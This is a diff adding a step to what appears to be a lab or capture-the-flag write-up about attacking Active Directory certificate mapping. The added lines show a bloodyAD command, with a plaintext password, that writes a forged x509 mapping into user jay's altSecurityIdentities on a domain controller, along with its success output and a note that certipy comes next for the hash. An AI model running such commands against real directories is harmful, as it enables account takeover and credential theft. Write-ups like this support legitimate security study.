@@ -565,6 +565,13 @@ I just remove the spaces in the issuer and the serial is just backwards without 
 I can now write this value to `jay`s `altSecurityIdentities`
 
 ```python
+bloodyAD --host dc01.casper.hsm -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' set object jay altSecurityIdentities -v 'x509:<I>DC=hsm,DC=casper,CN=casper-DC01-CA<SR>3c0000000000c14e8285afc81ba63c0000004d'
+[+] jay's altSecurityIdentities has been updated
+```
+
+Now this value is written to the correct value i can use certipy to get `jay`s hash
+
+```python
 
 ```
 
